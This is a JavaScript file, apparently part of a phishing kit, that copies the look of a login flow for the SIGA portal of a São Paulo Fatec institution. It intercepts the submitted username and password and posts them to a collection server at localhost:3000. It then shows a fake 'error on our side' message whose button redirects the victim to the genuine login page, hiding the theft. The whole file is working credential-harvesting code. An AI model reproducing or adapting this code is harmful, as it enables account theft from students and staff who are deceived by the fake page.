document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("login-form");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = form.elements["username"].value.trim();
    const password = form.elements["password"].value.trim();

    if (!username || !password) {
      return;
    }

    try {
      const response = await fetch("http://localhost:3000/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: username,
          password: password,
        }),
      });

      if (response.ok) {
        console.log("Credenciais enviadas.");
        mostrarErroGenerico();
      } else {
        console.error("Erro no envio");
        alert("Erro ao enviar dados.");
      }
    } catch (err) {
      console.error("Erro na requisição:", err);
      alert("Falha na comunicação com o servidor.");
    }
  });

  function mostrarErroGenerico() {
    document.body.innerHTML = `
      <div style="font-family: Verdana, sans-serif; text-align: center; padding-top: 100px;">
        <h2 style="color: #cc0000;">Erro da nossa parte</h2>
        <p>Pedimos desculpas, ocorreu um erro inesperado. Tente novamente em instantes.</p>
        <button id="btn-voltar" style="
          margin-top: 20px;
          background-color: #3366cc;
          color: white;
          border: none;
          padding: 10px 20px;
          font-size: 1rem;
          cursor: pointer;
          font-family: Verdana, sans-serif;
        ">
          Recarregar
        </button>
      </div>
    `;

    document.getElementById("btn-voltar").addEventListener("click", () => {
      window.location.href = "https://siga.cps.sp.gov.br/fatec/login.aspx";
    });
  }
});